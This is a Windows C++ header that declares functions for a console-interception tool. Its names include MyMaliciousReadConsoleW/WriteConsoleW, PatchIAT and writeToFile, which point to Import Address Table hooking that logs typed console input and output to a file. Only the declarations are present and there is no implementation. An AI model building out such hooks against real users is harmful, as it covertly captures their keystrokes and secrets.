#pragma once
#define WIN32_LEAN_AND_MEAN             // Exclude rarely-used stuff from Windows headers
// Windows Header Files:
#include <windows.h>
#include "tchar.h"
#include <iostream>

using namespace std;

void** getFunctionAddress(string const& const wantedFunctionName, string const& const wantedDllName);

enum MyMalicious {
	_MyMaliciousReadConsoleW,
	_MyMaliciousWriteConsoleW
};

BOOL WINAPI MyMaliciousReadConsoleW(
	_In_     HANDLE  hConsoleInput,
	_Out_    LPVOID  lpBuffer,
	_In_     DWORD   nNumberOfCharsToRead,
	_Out_    LPDWORD lpNumberOfCharsRead,
	_In_opt_ PCONSOLE_READCONSOLE_CONTROL  pInputControl
);

BOOL WINAPI MyMaliciousWriteConsoleW(
	_In_             HANDLE  hConsoleOutput,
	_In_       const VOID    *lpBuffer,
	_In_             DWORD   nNumberOfCharsToWrite,
	_Out_            LPDWORD lpNumberOfCharsWritten,
	_Reserved_       LPVOID  lpReserved
);

void writeToFile(string const& const _Filename, string const& const opening, void const* lpBuffer, MyMalicious const& const func);

void PatchIAT(string const& const wantedFunctionName, string const& const wantedDllName, MyMalicious const& const func);